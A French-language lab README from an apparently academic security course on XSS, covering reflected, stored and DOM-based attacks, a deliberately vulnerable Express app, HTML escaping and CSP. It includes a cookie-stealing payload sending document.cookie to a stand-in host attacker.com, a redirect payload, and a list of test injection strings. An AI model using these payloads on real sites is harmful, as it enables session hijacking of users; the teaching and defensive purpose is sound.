# Room 4 - XSS (Cross-Site Scripting)

## Objectif de la room

Cette room vous apprend à comprendre et prévenir les attaques XSS, l'une des vulnérabilités les plus courantes sur le web.

À la fin de cette room, vous serez capable de :
- Comprendre ce qu'est le XSS et ses différentes formes
- Identifier du code vulnérable au XSS
- Échapper et sanitizer les entrées utilisateur
- Implémenter une Content Security Policy (CSP) de base

## Scénario narratif

Vous développez une application de blog où les utilisateurs peuvent laisser des commentaires. Les commentaires sont affichés directement sur la page. Votre collègue vous montre le code et vous avez un mauvais pressentiment...

Votre mission : comprendre la vulnérabilité XSS, voir comment elle peut être exploitée, et implémenter une version sécurisée.

## Qu'est-ce que le XSS ?

**XSS (Cross-Site Scripting)** est une vulnérabilité qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs. Le nom "Cross-Site" peut prêter à confusion : le code s'exécute sur le site ciblé, pas sur un autre site. Le terme vient du fait que l'attaquant injecte du code depuis un site externe.

**Pourquoi c'est dangereux** : Le JavaScript injecté s'exécute dans le contexte du site web légitime, avec les mêmes privilèges que le JavaScript légitime. Cela permet de voler des cookies de session, modifier le contenu de la page, rediriger vers des sites malveillants, ou voler des données saisies par l'utilisateur.

### Types de XSS

#### 1. XSS Réfléchi (Reflected XSS)

Le code malveillant est **reflété immédiatement** dans la réponse HTTP, souvent via les paramètres d'URL, les champs de formulaire, ou les headers HTTP. Il n'est pas stocké sur le serveur.

**Caractéristiques** :
- Le code malveillant apparaît dans l'URL ou les paramètres de la requête
- Il est immédiatement inclus dans la réponse HTML sans échappement
- Il nécessite que la victime clique sur un lien malveillant ou soumette un formulaire

**Exemple** :
```
URL : http://site.com/search?q=<script>alert('XSS')</script>
Réponse HTML : <div>Résultats pour <script>alert('XSS')</script></div>
```

**Scénario d'attaque** :
1. L'attaquant crée un lien malveillant avec du JavaScript dans l'URL
2. L'attaquant envoie ce lien à la victime (email, message, etc.)
3. La victime clique sur le lien
4. Le site reflète le JavaScript dans la page
5. Le JavaScript s'exécute dans le navigateur de la victime

#### 2. XSS Stocké (Stored XSS ou Persistent XSS)

Le code malveillant est **stocké dans la base de données** (ou un autre stockage persistant) et exécuté à chaque fois que la page est chargée. C'est le type de XSS le plus dangereux car il affecte tous les utilisateurs qui voient le contenu stocké.

**Caractéristiques** :
- Le code malveillant est stocké de manière permanente
- Il s'exécute automatiquement pour tous les utilisateurs qui voient le contenu
- Il ne nécessite pas que la victime clique sur un lien spécifique

**Exemple** :
```
Commentaire posté : "Super article ! <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
Chaque fois qu'un utilisateur voit ce commentaire, le script s'exécute et vole son cookie de session.
```

**Scénario d'attaque** :
1. L'attaquant poste un commentaire contenant du JavaScript malveillant
2. Le commentaire est stocké dans la base de données
3. Tous les utilisateurs qui voient ce commentaire exécutent automatiquement le script
4. Le script vole les cookies de session ou effectue d'autres actions malveillantes

#### 3. XSS basé sur le DOM (DOM-based XSS)

Le code malveillant modifie le **DOM directement via JavaScript côté client**, sans que le code malveillant ne soit présent dans le HTML initial envoyé par le serveur. La vulnérabilité se trouve dans le code JavaScript côté client qui manipule le DOM de manière non sécurisée.

**Caractéristiques** :
- Le code malveillant n'apparaît pas dans le HTML initial
- Il est injecté via manipulation JavaScript du DOM
- Il peut être déclenché par des fragments d'URL (hash), des paramètres, ou d'autres sources

**Exemple** :
```javascript
// Code vulnérable côté client
document.getElementById('message').innerHTML = location.hash.substring(1);
// Si l'URL est : http://site.com/#<img src=x onerror=alert('XSS')>
// Le code s'exécute
```

**Scénario d'attaque** :
1. L'attaquant crée un lien avec du JavaScript dans le hash de l'URL
2. La victime clique sur le lien
3. Le JavaScript côté client lit le hash et l'insère dans le DOM sans échappement
4. Le JavaScript malveillant s'exécute

## Démarrage

### Prérequis

Avant de commencer, vérifiez que vous avez :

- Docker installé et fonctionnel
- Docker Compose installé et fonctionnel
- Un navigateur web moderne (Chrome, Firefox, Edge)

### Vérification de l'installation

#### Windows (PowerShell)

```powershell
# 1. Vérifier Docker
docker --version
# Résultat attendu : Docker version 20.10.x ou supérieur

# 2. Vérifier Docker Compose
docker-compose --version
# Résultat attendu : docker-compose version 1.29.x ou supérieur

# 3. Vérifier que Docker fonctionne
docker ps
# Résultat attendu : Liste des conteneurs (peut être vide, c'est normal)
```

**Si vous avez une erreur :**

- Docker n'est pas installé : Téléchargez Docker Desktop depuis https://www.docker.com/products/docker-desktop
- Docker n'est pas démarré : Lancez Docker Desktop depuis le menu Démarrer

#### Mac (Terminal)

```bash
# 1. Vérifier Docker
docker --version
# Résultat attendu : Docker version 20.10.x ou supérieur

# 2. Vérifier Docker Compose
docker-compose --version
# Résultat attendu : docker-compose version 1.29.x ou supérieur

# 3. Vérifier que Docker fonctionne
docker ps
# Résultat attendu : Liste des conteneurs (peut être vide, c'est normal)
```

**Si vous avez une erreur :**

- Docker n'est pas installé : Téléchargez Docker Desktop depuis https://www.docker.com/products/docker-desktop
- Docker n'est pas démarré : Lancez Docker Desktop depuis Applications

#### Linux (Terminal)

```bash
# 1. Vérifier Docker
docker --version
# Résultat attendu : Docker version 20.10.x ou supérieur

# 2. Vérifier Docker Compose
docker-compose --version
# Résultat attendu : docker-compose version 1.29.x ou supérieur

# 3. Vérifier que Docker fonctionne
docker ps
# Résultat attendu : Liste des conteneurs (peut être vide, c'est normal)
```

**Si vous avez une erreur :**

Installez Docker en suivant les instructions officielles : https://docs.docker.com/get-docker/

### Lancer l'environnement vulnérable

**Explication :** Nous allons lancer l'application vulnérable pour voir les problèmes en action avant de les corriger.

#### Windows (PowerShell)

```powershell
# 1. Ouvrez PowerShell
# 2. Naviguez vers le dossier de la room
cd C:\Users\VotreNom\Desktop\Cybersecu_Ensitech\room-4-xss

# 3. Lancez Docker Compose
docker-compose up -d

# 4. Vérifiez que ça fonctionne
docker-compose ps
# Vous devriez voir deux conteneurs : room4-xss-vulnerable et room4-xss-secured
```

**Que fait cette commande ?**

- `docker-compose up -d` : Lance les conteneurs Docker en arrière-plan
- `-d` signifie "detached" (détaché) : les conteneurs tournent en arrière-plan
- Les deux applications (vulnérable et sécurisée) démarrent automatiquement

#### Mac (Terminal)

```bash
# 1. Ouvrez Terminal
# 2. Naviguez vers le dossier de la room
cd ~/Desktop/Cybersecu_Ensitech/room-4-xss

# 3. Lancez Docker Compose
docker-compose up -d

# 4. Vérifiez que ça fonctionne
docker-compose ps
# Vous devriez voir deux conteneurs : room4-xss-vulnerable et room4-xss-secured
```

#### Linux (Terminal)

```bash
# 1. Ouvrez Terminal
# 2. Naviguez vers le dossier de la room
cd ~/Desktop/Cybersecu_Ensitech/room-4-xss

# 3. Lancez Docker Compose
docker-compose up -d

# 4. Vérifiez que ça fonctionne
docker-compose ps
# Vous devriez voir deux conteneurs : room4-xss-vulnerable et room4-xss-secured
```

**Vérification :**

Ouvrez votre navigateur et allez sur :
- `http://localhost:3004` → Application vulnérable
- `http://localhost:3005` → Application sécurisée

**Si ça ne fonctionne pas :**

- Vérifiez les logs : `docker-compose logs`
- Vérifiez que les ports 3004 et 3005 ne sont pas déjà utilisés
- Assurez-vous que Docker Desktop est lancé

## Analyse du code vulnérable

### Où se trouve le code ?

Le code vulnérable se trouve dans `/src-vulnerable/`

### Problème principal : Affichage non échappé

**Définition de l'échappement**

L'échappement HTML consiste à remplacer les caractères spéciaux HTML par leurs équivalents encodés pour qu'ils soient affichés comme du texte et non interprétés comme du code.

**Exemple de code vulnérable**

```javascript
// VULNÉRABLE
app.get('/search', (req, res) => {
    const query = req.query.q || '';
    // PROBLÈME : Injection directe sans échappement
    res.send(`<div>Résultats pour : ${query}</div>`);
});
```

**Comment ça marche (pourquoi c'est vulnérable) ?**

1. L'utilisateur entre : `<script>alert('XSS')</script>` dans le champ de recherche
2. Le serveur reçoit cette valeur dans `req.query.q`
3. Le serveur envoie directement cette valeur dans le HTML : `<div>Résultats pour : <script>alert('XSS')</script></div>`
4. Le navigateur reçoit ce HTML
5. Le navigateur interprète le `<script>` comme du code JavaScript et l'exécute
6. Résultat : Le script s'exécute dans le navigateur de l'utilisateur

**Pourquoi c'est dangereux ?**

Si au lieu de `alert('XSS')`, l'attaquant injecte :
```javascript
<script>
    // Voler le cookie de session
    document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```
Le cookie de session sera envoyé à l'attaquant, qui pourra se connecter à la place de la victime.

## Version sécurisée

### Où se trouve le code ?

Le code sécurisé se trouve dans `/src-secured/`

### Solution : Échappement HTML

**Définition**

L'échappement HTML transforme les caractères spéciaux en entités HTML pour qu'ils soient affichés comme du texte.

**Exemple de code sécurisé**

```javascript
// SÉCURISÉ
function escapeHtml(text) {
    const map = {
        '&': '&amp;',   // & devient &amp;
        '<': '&lt;',    // < devient &lt;
        '>': '&gt;',    // > devient &gt;
        '"': '&quot;',  // " devient &quot;
        "'": '&#039;'   // ' devient &#039;
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

app.get('/search', (req, res) => {
    const query = req.query.q || '';
    // SOLUTION : Échappement avant affichage
    const safeQuery = escapeHtml(query);
    res.send(`<div>Résultats pour : ${safeQuery}</div>`);
});
```

**Comment ça marche (pourquoi c'est sécurisé) ?**

1. L'utilisateur entre : `<script>alert('XSS')</script>`
2. Le serveur reçoit cette valeur
3. La fonction `escapeHtml()` transforme :
   - `<` → `&lt;`
   - `>` → `&gt;`
   - Résultat : `&lt;script&gt;alert('XSS')&lt;/script&gt;`
4. Le serveur envoie : `<div>Résultats pour : &lt;script&gt;alert('XSS')&lt;/script&gt;</div>`
5. Le navigateur reçoit ce HTML
6. Le navigateur affiche `&lt;script&gt;` comme du texte, pas comme du code
7. Résultat : Le script ne s'exécute pas !

**Table de correspondance**

| Caractère | Entité HTML | Pourquoi |
|-----------|-------------|----------|
| `<` | `&lt;` | Début de balise HTML |
| `>` | `&gt;` | Fin de balise HTML |
| `&` | `&amp;` | Début d'entité HTML |
| `"` | `&quot;` | Guillemets dans attributs |
| `'` | `&#039;` | Apostrophe |

### Autres solutions

**Solution 2 : Utiliser un template engine sécurisé**

Les frameworks modernes (React, Vue, etc.) échappent automatiquement par défaut.

**Solution 3 : Content Security Policy (CSP)**

```javascript
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "default-src 'self'");
    next();
});
```

La CSP est une couche de défense supplémentaire qui empêche l'exécution de scripts non autorisés.

## Ressources pédagogiques

### Ordre recommandé de consultation

Pour tirer le meilleur parti de cette room, suivez cet ordre :

1. **Lisez ce README** pour comprendre les différents types de XSS
2. **Lancez l'application vulnérable** et testez des injections XSS pour voir comment elles fonctionnent
3. **Analysez le code vulnérable** pour identifier les problèmes
4. **Réalisez l'exercice** dans `/exercises/` pour implémenter l'échappement
5. **Comparez avec la version sécurisée** pour voir les bonnes pratiques
6. **Vérifiez votre implémentation** avec la checklist de sécurité

### Exercices guidés

L'exercice vous guide pour sécuriser le code :

- **[Exercice 1 : Échapper les données utilisateur](./exercises/exercise-1.md)** - Implémenter une fonction d'échappement HTML et l'utiliser pour sécuriser l'affichage

**Conseil** : Testez d'abord les injections XSS sur l'application vulnérable pour bien comprendre le problème. Consultez la solution dans `/SOLUTIONS/room-4/` uniquement après avoir tenté de résoudre par vous-même.

### Checklist de sécurité

Utilisez la **[checklist de sécurité complète](./checklists/security-checklist.md)** pour vérifier que votre code est protégé contre le XSS. Cette checklist couvre :

- Échappement des données utilisateur (HTML, JavaScript, CSS, URL)
- Validation des entrées (complémentaire à l'échappement)
- Content Security Policy (CSP) comme couche de défense supplémentaire
- Bonnes pratiques (éviter innerHTML, eval, etc.)

**Conseil** : Utilisez cette checklist comme référence lors du développement de vos propres applications.

## Erreurs fréquentes

- Penser que la validation suffit (la validation ne protège pas contre XSS)
- Oublier d'échapper dans certains contextes (HTML, JavaScript, CSS, URL)
- Désactiver l'échappement "parce que ça casse le design"

## Comment partager vos réponses et votre code

Pour partager votre fonction d'échappement, c'est très simple :

### Méthode simple : Créer une Issue GitHub

1. Allez sur la page GitHub du dépôt
2. Cliquez sur **"Issues"** puis **"New Issue"**
3. Dans le **titre**, écrivez : `[Room 4] Fonction escapeHtml - Votre nom`
4. Dans le **corps**, collez directement votre code

**C'est tout !** Collez simplement votre code dans l'issue.

### Format simple pour partager

Copiez-collez ce format :

````
# Mes réponses - Room 4

## Ma fonction escapeHtml() :

```javascript
// Collez ici votre fonction escapeHtml()
function escapeHtml(text) {
    // Votre code ici
}
```

## Tests que j'ai effectués :
- `<script>alert('XSS')</script>` : [Décrivez ce qui s'est passé]
- `<img src=x onerror=alert('XSS')>` : [Décrivez ce qui s'est passé]

## Comment j'utilise la fonction :
```javascript
// Montrez comment vous utilisez escapeHtml() dans votre code
```
````

### Si vous avez des questions

Créez une issue avec le titre : `[Question] Room 4 - Votre question`

Expliquez :
- Ce que vous essayez de faire
- Le problème que vous rencontrez
- Ce que vous avez déjà essayé

## Tests à effectuer

### Test 1 : XSS Réfléchi

**Objectif :** Tester l'injection XSS dans la recherche

**Étapes :**

1. Allez sur `http://localhost:3004`
2. Dans le champ de recherche, entrez : `<script>alert('XSS')</script>`
3. Cliquez sur "Rechercher"

**Résultat attendu (vulnérable) :**

- Une alerte JavaScript s'affiche
- Cela prouve que le code s'exécute

**Résultat attendu (sécurisé) :**

- Le texte `<script>alert('XSS')</script>` s'affiche comme du texte
- Aucune alerte ne s'affiche

---

### Test 2 : XSS Stocké

**Objectif :** Tester l'injection XSS dans les commentaires

**Étapes :**

1. Allez sur `http://localhost:3004`
2. Dans le formulaire de commentaire :
   - Nom : `Test`
   - Commentaire : `<img src=x onerror=alert('XSS')>`
3. Cliquez sur "Publier"
4. Rechargez la page

**Résultat attendu (vulnérable) :**

- Une alerte JavaScript s'affiche à chaque chargement de page
- Cela prouve que le code est stocké et exécuté

**Résultat attendu (sécurisé) :**

- Le texte `<img src=x onerror=alert('XSS')>` s'affiche comme du texte
- Aucune alerte ne s'affiche

---

## Exemples de payloads XSS à tester

**Note importante :** Ces tests sont pour l'apprentissage uniquement. Ne les utilisez jamais sur des sites réels sans autorisation.

### Payloads basiques

**Test 1 : XSS avec script**
```
<script>alert('XSS')</script>
```
**Explication :** Le payload le plus simple. Si une alerte s'affiche, il y a un XSS.

**Test 2 : XSS avec image**
```
<img src=x onerror=alert('XSS')>
```
**Explication :** Utilise l'événement `onerror` d'une image. Si l'image ne peut pas charger, le script s'exécute.

**Test 3 : XSS avec SVG**
```
<svg onload=alert('XSS')>
```
**Explication :** Utilise l'événement `onload` d'un élément SVG.

**Test 4 : XSS avec événement de souris**
```
<div onmouseover=alert('XSS')>Survolez-moi</div>
```
**Explication :** Le script s'exécute quand vous survolez l'élément avec la souris.

### Payloads avancés (pour comprendre)

**Test 5 : Vol de cookie (simulation)**
```
<script>alert(document.cookie)</script>
```
**Explication :** Affiche les cookies de session. Dans une vraie attaque, un attaquant pourrait envoyer ces cookies à son serveur.

**Test 6 : Redirection**
```
<script>document.location='http://attacker.com'</script>
```
**Explication :** Redirige vers un site malveillant. Ne testez pas cela, cela pourrait vous rediriger.

**Test 7 : XSS avec encodage**
```
%3Cscript%3Ealert('XSS')%3C/script%3E
```
**Explication :** Version encodée URL. Certaines applications décodent automatiquement.

### Comment tester ces payloads

1. **Dans le champ de recherche :**
   - Copiez un payload
   - Collez-le dans le champ de recherche
   - Cliquez sur "Rechercher"
   - Observez le résultat

2. **Dans les commentaires :**
   - Copiez un payload
   - Collez-le dans le champ commentaire
   - Publiez
   - Rechargez la page
   - Observez le résultat

### Ce qu'il faut observer

**Si l'application est vulnérable :**
- Une alerte JavaScript s'affiche
- Le code s'exécute dans le navigateur
- Les cookies peuvent être volés
- Le contenu de la page peut être modifié

**Si l'application est sécurisée :**
- Le texte s'affiche tel quel (échappé)
- Aucune alerte ne s'affiche
- Le code ne s'exécute pas
- Les caractères spéciaux sont transformés (ex: `<` devient `&lt;`)

### Pourquoi tester plusieurs payloads ?

Différents payloads fonctionnent dans différents contextes :
- Certains filtres bloquent `<script>` mais pas `<img>`
- Certains contextes nécessitent des événements HTML
- Certaines applications décodent l'URL automatiquement

Tester plusieurs payloads vous aide à comprendre comment les filtres fonctionnent (ou ne fonctionnent pas).

---

## Arrêter l'environnement

Quand vous avez terminé, arrêtez les conteneurs :

```bash
# Depuis le dossier room-4-xss
docker-compose down
```

**Que fait cette commande ?**

- Arrête tous les conteneurs de cette room
- Libère les ports utilisés
- Nettoie les ressources Docker

---

## Questions fréquentes

**Q : Pourquoi utiliser Docker ?**

R : Docker permet d'avoir un environnement identique sur Windows, Mac et Linux, sans avoir à installer Node.js, npm, etc. C'est plus simple pour les débutants.

**Q : Je ne comprends pas l'échappement HTML**

R : Imaginez que vous voulez afficher le texte `<script>` sur une page web. Si vous l'écrivez tel quel dans le HTML, le navigateur va l'interpréter comme une balise. L'échappement transforme `<script>` en `&lt;script&gt;` pour que le navigateur l'affiche comme du texte.

**Q : Est-ce que la validation suffit ?**

R : Non ! La validation vérifie que les données sont correctes, mais elle ne protège pas contre le XSS. Il faut toujours échapper les données avant de les afficher.

---

## Glossaire

- **XSS (Cross-Site Scripting)** : Injection de code JavaScript malveillant dans une page web
- **Échappement HTML** : Transformation des caractères spéciaux en entités HTML
- **DOM (Document Object Model)** : Représentation de la structure HTML en JavaScript
- **Réfléchi** : XSS où le code est reflété immédiatement dans la réponse
- **Stocké** : XSS où le code est stocké dans la base de données
- **DOM-based** : XSS où le code modifie le DOM côté client

---

## Prochaines étapes

Une fois que vous maîtrisez le XSS, vous êtes prêt pour la **Room 5 - Sécuriser une API**.

